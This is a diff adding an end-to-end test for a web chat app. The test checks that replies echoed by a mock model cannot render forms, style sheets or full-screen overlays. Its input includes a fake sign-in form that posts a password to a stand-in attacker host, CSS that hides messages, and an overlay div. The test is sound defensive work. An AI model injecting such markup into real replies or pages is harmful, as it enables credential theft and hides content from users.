@@ -3,6 +3,7 @@ import {test, expect} from './support/fixtures';
 import {expectedCost} from './support/cost';
 import {uniqueName} from './support/gateway';
 import {createBrokenProvider} from './support/providers';
+import {LLM} from './support/constants';
 
 async function pickModel(page: Page, t: (key: string) => string, displayName: string) {
 	await page.getByTestId('model-selector').click();
@@ -41,6 +42,32 @@ test.describe('web chat', () => {
 		await page.reload();
 		await expect(page.locator('[data-testid="message"][data-role="user"]').filter({hasText: prompt})).toHaveCount(1);
 		await expect(assistantMessages(page).first()).toContainText(reply);
+	});
+
+	test('a reply cannot draw forms, style sheets or overlays, and code stays highlighted', async ({page, t, seed}) => {
+		test.skip(!LLM.isMock, 'only the local stand-in echoes the prompt back as the reply');
+		await page.goto('/');
+		await pickModel(page, t, seed.model.displayName);
+		const html = [
+			'<form action="https://evil.example/collect"><input name="password" type="password"><textarea></textarea><select><option>x</option></select><button formaction="https://evil.example">Sign in</button></form>',
+			'<style>[data-testid="message"] { display: none }</style>',
+			'<div style="position:fixed;inset:0">overlay</div>',
+			'',
+			'- [x] done',
+			'',
+			'```js',
+			'const answer = 42;',
+			'```',
+		].join('\n');
+		await send(page, html);
+		await expectReplyCount(page, 1);
+
+		const reply = assistantMessages(page).first();
+		await expect(reply).toContainText('overlay');
+		await expect(reply.locator('form, style, textarea, select, input:not([type="checkbox"]), [action], [formaction]')).toHaveCount(0);
+		await expect(reply.locator('[style*="position"], [style*="inset"]')).toHaveCount(0);
+		await expect(reply.locator('input[type="checkbox"][disabled]')).toHaveCount(1);
+		await expect(reply.locator('.shiki span[style*="color"]').first()).toBeVisible();
 	});
 
 	test('a follow-up message in the same chat gets its own reply', async ({page, t, seed}) => {
